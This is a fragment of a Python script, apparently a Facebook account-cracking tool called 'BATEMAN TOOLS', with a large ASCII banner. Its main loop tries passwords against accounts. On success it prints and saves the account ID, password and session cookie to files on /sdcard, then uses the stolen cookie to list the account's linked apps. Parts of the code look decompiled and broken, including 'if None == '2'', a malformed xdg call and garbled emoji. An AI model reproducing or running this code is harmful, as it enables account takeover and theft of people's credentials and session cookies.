...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/Itz.BATEMAN.Brand')
        return None
    if None == '3':
        os.system('xdg- clear')
        return None
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{PURPLE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{BLUE}'%(M))
        for i in range(len(game)):
...
\033[1;36m$$  __$$\            $$ |                                                
\033[1;36m$$ |  $$ | $$$$$$\ $$$$$$\    $$$$$$\  $$$$$$\$$$$\   $$$$$$\  $$$$$$$\  
\033[1;36m$$$$$$$\ | \____$$\\_$$  _|  $$  __$$\ $$  _$$  _$$\  \____$$\ $$  __$$\ 
\033[1;36m$$  __$$\  $$$$$$$ | $$ |    $$$$$$$$ |$$ / $$ / $$ | $$$$$$$ |$$ |  $$ |
\033[1;36m$$ |  $$ |$$  __$$ | $$ |$$\ $$   ____|$$ | $$ | $$ |$$  __$$ |$$ |  $$ |
\033[1;36m$$$$$$$  |\$$$$$$$ | \$$$$  |\$$$$$$$\ $$ | $$ | $$ |\$$$$$$$ |$$ |  $$ |
\_______/  \_______|  \____/  \_______|\__| \__| \__| \_______|\__|  \__|
                                                                                                              
                                                                                                      
\033[1;37m================= \33[32;45mSHAN\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mBATEMAN
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m UNKNOWN
...
\033[1;37m================= \33[32;45mMR\33[0;m =====================
       ...
       \33[37;41m\t WELLCOME TO BATEMAN TOOLS\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(BATEMAN-OK.)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/BATEMAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(BATEMAN-CP•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BATEMAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[BATEMAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
